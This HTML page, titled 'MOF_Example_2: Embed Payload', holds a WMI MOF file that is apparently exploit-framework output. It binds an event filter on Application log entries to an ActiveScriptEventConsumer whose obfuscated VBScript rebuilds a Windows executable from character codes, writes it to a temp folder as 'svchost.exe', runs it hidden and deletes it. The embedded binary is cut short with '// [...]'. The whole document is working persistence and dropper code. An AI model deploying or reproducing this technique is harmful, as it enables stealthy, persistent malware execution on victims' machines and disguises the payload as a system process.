<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>MOF_Example_2: Embed Payload</title>
</head><body>#pragma namespace ("\\\\.\\root\\subscription")<br/>
<br/>
instance of __EventFilter as $FILTER<br/>
{<br/>
&nbsp; &nbsp; Name = "XPLOIT_TEST_SYSTEM";<br/>
&nbsp; &nbsp; EventNamespace = "root\\cimv2";<br/>
&nbsp; &nbsp; Query = "SELECT * FROM __InstanceCreationEvent "<br/>
&nbsp; "WHERE TargetInstance ISA \"Win32_NTLogEvent\" AND "<br/>
&nbsp; "TargetInstance.LogFile=\"Application\"";<br/>
<br/>
&nbsp; &nbsp; QueryLanguage = "WQL";<br/>
};<br/>
<br/>
instance of ActiveScriptEventConsumer as $CONSUMER<br/>
{<br/>
&nbsp; &nbsp; Name = "XPLOIT_TEST_SYSTEM";<br/>
&nbsp; &nbsp; ScriptingEngine = "VBScript";<br/>
<br/>
&nbsp; &nbsp; ScriptText = "Function jcmNPtWMUEOI() \n"<br/>
"vURTl=Chr(77)&amp;Chr(90)&amp;Chr(144)&amp;Chr(0)&amp;Chr(3)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(4)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(255)&amp;Chr(255)&amp;Chr(0)&amp;Chr(0)&amp;Chr(184)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(64)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(232)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(14)&amp;Chr(31)&amp;Chr(186)&amp;Chr(14)&amp;Chr(0)&amp;Chr(180)&amp;Chr(9)&amp;Chr(205)&amp;Chr(33)&amp;Chr(184)&amp;Chr(1)&amp;Chr(76)&amp;Chr(205)&amp;Chr(33)&amp;Chr(84)&amp;Chr(104)&amp;Chr(105)&amp;Chr(115)&amp;Chr(32)&amp;Chr(112)&amp;Chr(114)&amp;Chr(111)&amp;Chr(103)&amp;Chr(114)&amp;Chr(97)&amp;Chr(109)&amp;Chr(32)&amp;Chr(99)&amp;Chr(97)&amp;Chr(110)&amp;Chr(110)&amp;Chr(111)&amp;Chr(116)&amp;Chr(32)&amp;Chr(98)&amp;Chr(101) \n"<br/>
// [...]<br/>
"vURTl=vURTl&amp;Chr(0)&amp;Chr(16)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(32)&amp;Chr(0)&amp;Chr(0)&amp;Chr(96)&amp;Chr(46)&amp;Chr(114)&amp;Chr(100)&amp;Chr(97)&amp;Chr(116)&amp;Chr(97)&amp;Chr(0)&amp;Chr(0)&amp;Chr(230)&amp;Chr(15)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(192)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(16)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(192)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(64)&amp;Chr(0)&amp;Chr(0)&amp;Chr(64)&amp;Chr(46)&amp;Chr(100)&amp;Chr(97)&amp;Chr(116)&amp;Chr(97)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(92)&amp;Chr(112)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(208)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(64)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(208)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(0)&amp;Chr(64)&amp;Chr(0)&amp;Chr(0)&amp;Chr(192) \n" <br/>
"Dim eXmdsyLFEs \n"<br/>
"Set eXmdsyLFEs = CreateObject(\"Scripting.FileSystemObject\") \n"<br/>
"Dim TxNAbBlYJ \n"<br/>
"Dim OnzEldZtxrMeY \n"<br/>
"Dim YzlWLAgbdcsRP \n"<br/>
"Dim gpvFZLaXwIZzKCJ \n"<br/>
"Set OnzEldZtxrMeY = eXmdsyLFEs.GetSpecialFolder(2) \n"<br/>
"gpvFZLaXwIZzKCJ = OnzEldZtxrMeY &amp; \"\\\" &amp; eXmdsyLFEs.GetTempName() \n"<br/>
"eXmdsyLFEs.CreateFolder(gpvFZLaXwIZzKCJ) \n"<br/>
"YzlWLAgbdcsRP = gpvFZLaXwIZzKCJ &amp; \"\\\" &amp; \"svchost.exe\" \n"<br/>
"Set TxNAbBlYJ = eXmdsyLFEs.CreateTextFile(YzlWLAgbdcsRP,2,0) \n"<br/>
"TxNAbBlYJ.Write vURTl \n"<br/>
"TxNAbBlYJ.Close \n"<br/>
"Dim VvLFolkbOsQvlf \n"<br/>
"Set VvLFolkbOsQvlf = CreateObject(\"Wscript.Shell\") \n"<br/>
"VvLFolkbOsQvlf.run YzlWLAgbdcsRP, 0, true \n"<br/>
"eXmdsyLFEs.DeleteFile(YzlWLAgbdcsRP) \n"<br/>
"eXmdsyLFEs.DeleteFolder(gpvFZLaXwIZzKCJ) \n"<br/>
"End Function \n"<br/>
"jcmNPtWMUEOI \n"; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
};<br/>
<br/>
instance of __FilterToConsumerBinding<br/>
{<br/>
&nbsp; &nbsp; Consumer = $CONSUMER ;<br/>
&nbsp; &nbsp; Filter = $FILTER ;<br/>
};</body></html>